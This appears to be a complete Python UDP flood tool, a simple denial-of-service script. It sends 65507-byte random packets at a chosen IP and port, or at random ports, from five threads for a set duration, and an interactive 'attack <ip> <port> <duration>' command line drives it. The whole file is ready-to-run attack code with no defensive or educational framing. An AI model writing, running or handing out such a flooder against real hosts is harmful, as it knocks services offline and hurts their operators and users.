import threading
import socket
import os
import time
import random

def UDPFlood(ip, port, duration):
    randport = (True, False)[port == 0]
    timeout = time.time() + duration
    bytes_to_send = os.urandom(65507)

    print(f"Sending packets to {ip}:{port or 'random'} for {duration} seconds")

    while True:
        if time.time() > timeout:
            break
        try:
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            current_port = port if not randport else random.randint(1, 65535)
            udp_sock.sendto(bytes_to_send, (ip, current_port))
        except Exception as e:
            print(f"Error: {e}")
            break

def main():
    print("Usage: attack <ip> <port> <duration>")
    while True:
        command = input("> ")
        if command.startswith("attack"):
            try:
                _, ip, port, duration = command.split()
                threads = 5  # Modify thread count as needed
                for _ in range(threads):
                    thread = threading.Thread(target=UDPFlood, args=(ip, int(port), int(duration)))
                    thread.start()
            except ValueError:
                print("Invalid input format. Use: attack <ip> <port> <duration>")

if __name__ == "__main__":
    main()